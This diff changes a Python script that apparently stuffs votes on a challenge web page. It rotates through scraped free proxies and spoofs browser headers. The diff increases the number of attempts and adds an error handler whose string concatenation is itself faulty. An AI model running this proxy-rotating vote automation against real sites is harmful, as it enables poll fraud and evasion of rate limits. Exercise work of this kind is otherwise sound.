@@ -7,6 +7,7 @@ import urllib3
 import random
 from requests.exceptions import ConnectionError
 import socket
+import http
 
 
 def getProxies(url):
@@ -65,7 +66,7 @@ urlProxies = "https://free-proxy-list.net/index.html"
 i = 0
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', 'Referer': 'http://158.69.76.135/level4.php'}
 with requests.session() as client:
-    while i  < 3:
+    while i  < 29:
         lenProxi = 0
         os.environ["HTTP_PROXY"] = ""
         votes = getVotes(url, int(sys.argv[1]))
@@ -83,7 +84,7 @@ with requests.session() as client:
         #os.environ["HTTP_PROXY"] = "http://112.78.191.35:8080"
         #os.system("export HTTP_PROXY=" + '"' + "110.74.222.213:52733" + '"')
         try:
-            client.post(url, data=data_post, headers = headers, cookies={'HoldTheDoor': cookies}, timeout=10)
+            client.post(url, data=data_post, headers = headers, cookies={'HoldTheDoor': cookies}, timeout=20)
             os.environ["HTTP_PROXY"] = ""
             if (int(getVotes(url, int(sys.argv[1]))) > int(votes)):
                 print('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
@@ -108,3 +109,5 @@ with requests.session() as client:
             print('\x1b[6;30;41m' + "ChunkedEncodingError" + '\x1b[0m')
         except urllib3.exceptions.ProxyError:
             print('\x1b[6;30;41m' + "ProxyError" + '\x1b[0m')
+        except http.client.RemoteDisconnected as mg:
+            print('\x1b[6;30;41m' + mg + '\x1b[0m')
